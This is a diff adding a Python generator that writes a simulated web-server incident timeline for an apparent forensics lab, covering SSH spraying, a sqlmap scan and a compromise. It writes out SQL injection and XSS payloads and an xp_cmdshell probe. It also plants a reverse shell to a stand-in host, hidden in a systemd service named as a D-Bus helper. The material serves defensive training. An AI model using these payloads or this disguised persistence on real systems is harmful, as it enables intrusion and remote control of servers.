@@ -1,0 +1,100 @@
+"""Generate config/timeline.events: web-server-01's morning, web + SSH + files, in a fixed order.
+
+Run from the lab directory: python3 tools/make_feed.py > config/timeline.events
+Line types: W|ip|request|status|size|agent   S|sshd message   F|path|content (printf %b)
+"""
+import random
+
+r = random.Random(5715)
+ATTACKER = "192.0.2.77"
+BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36"
+SQLMAP = "sqlmap/1.8.4#stable (https://sqlmap.org)"
+PAGES = ["/", "/index.php", "/product.php?id=%d", "/cart.php", "/static/app.css", "/static/app.js",
+         "/images/logo.png", "/account.php", "/login.php", "/search.php?search=brake+pads"]
+SPRAY = ["admin", "test", "oracle", "ubuntu", "pi", "guest", "user", "ftp", "postgres", "support",
+         "git", "jenkins", "ansible", "hadoop", "dev", "backup", "www", "minecraft", "test1", "deploy2"]
+
+
+def port():
+    return r.randint(32768, 60999)
+
+
+def web(ip, url, status, ua=BROWSER, size=None):
+    return "W|%s|GET %s|%d|%d|%s" % (ip, url, status, size or r.randint(150, 900), ua)
+
+
+def noisy_guess(user, ip):
+    p = port()
+    return ["S|Invalid user %s from %s port %d" % (user, ip, p),
+            "S|Failed password for invalid user %s from %s port %d ssh2" % (user, ip, p)]
+
+
+def slow_guess(user, ip):
+    p = port()
+    return ["S|Invalid user %s from %s port %d" % (user, ip, p),
+            "S|Connection closed by invalid user %s %s port %d [preauth]" % (user, ip, p)]
+
+
+def login(user, ip, method="publickey"):
+    return ["S|Accepted %s for %s from %s port %d ssh2" % (method, user, ip, port())]
+
+
+def normal_web(n):
+    out = []
+    for _ in range(n):
+        p = r.choice(PAGES)
+        out.append(web("10.20.%d.%d" % (r.randint(1, 3), r.randint(10, 60)), p % r.randint(1, 40) if "%d" in p else p, 200))
+    return out
+
+
+def mix(*streams):
+    """Interleave lists of steps at random, keeping each list's own order."""
+    streams = [list(s) for s in streams if s]
+    out = []
+    while streams:
+        s = r.choice(streams)
+        out.append(s.pop(0))
+        if not s:
+            streams.remove(s)
+    return out
+
+
+SQLI = ["/product.php?id=1%20union%20select%201,2,3--", "/product.php?id=1%20union%20select%20null,null--",
+        "/cart.php?item=5%20union%20select%20version()--", "/login.php?user=admin'%20union%20select%201--",
+        "/product.php?id=2+union+select+1,2", "/order.php?id=7%20where%201=1", "/product.php?id=3%20union%20all%20select%20null--",
+        "/product.php?id=4;exec%20xp_cmdshell('id')", "/cart.php?item=1%20union%20select%20user()--",
+        "/product.php?id=9%20union%20select%20table_name%20from%20information_schema.tables--"]
+
+steps = []
+# 1. Before the attack: an admin adds a drop-in for nginx; staff log in
+steps += normal_web(8)
+steps += login("mira", "10.20.0.21")
+steps += ["F|/etc/systemd/system/nginx.service.d/override.conf|[Service]\\nLimitNOFILE=65535\\n"]
+steps += login("ops", "10.20.0.33")
+# 2. The storm and the scanner, with the attacker's recon inside it
+storm = []
+for u in SPRAY + SPRAY[:10]:
+    storm += noisy_guess(u, "203.0.113.21")
+storm2 = []
+for u in r.sample(SPRAY, 14):
+    storm2 += noisy_guess(u, "198.51.100.140")
+scanner = [web("198.51.100.61", u, r.choice([403, 500]), SQLMAP) for u in SQLI]
+scanner += noisy_guess("root2", "198.51.100.61") + noisy_guess("admin", "198.51.100.61")
+xss = [web("198.51.100.140", "/comment.php?text=%3Cscript%3Ealert(" + str(i) + ")%3C/script%3E", 403) for i in range(5)]
+recon = [web(ATTACKER, u, r.choice([403, 500])) for u in ["/account.php?id=1'%20union%20select%201--",
+         "/account.php?id=1%20union%20select%20null,null--", "/account.php?id=1%20union%20select%20null,null,null--",
+         "/account.php?id=1%20union%20select%201,2,3%20from%20users--", "/account.php?id=1%20union%20select%20name,2,3%20from%20users--"]]
+recon += [web(ATTACKER, "/account.php?id=1%20union%20select%20username,password_hash,email%20from%20users--", 200, size=6421)]
+steps += mix(storm, storm2, scanner, xss, recon, normal_web(20))
+# 3. The attacker, slowly: seven names, never two log lines that look like a burst, then the hit
+slow = []
+for u in ["admin", "shop", "shopadmin", "web", "www-data", "nginx", "webmaster"]:
+    slow += slow_guess(u, ATTACKER)
+steps += mix(slow, normal_web(15), login("kenji", "10.20.0.40"), storm[-8:])
+steps += login("webadmin", ATTACKER, "password")
+# 4. Persistence, right after the login
+steps += ["F|/usr/local/sbin/dbus-update|#!/bin/sh\\nexec 3<>/dev/tcp/192.0.2.77/8443; sh <&3 >&3 2>&3\\n",
+          "F|/etc/systemd/system/dbus-update.service|[Unit]\\nDescription=D-Bus update helper\\n\\n[Service]\\nExecStart=/usr/local/sbin/dbus-update\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target\\n"]
+steps += normal_web(6) + login("mira", "10.20.0.21")
+print("# W|ip|request|status|size|agent   S|sshd message   F|path|content (generated by tools/make_feed.py)")
+print("\n".join(steps))
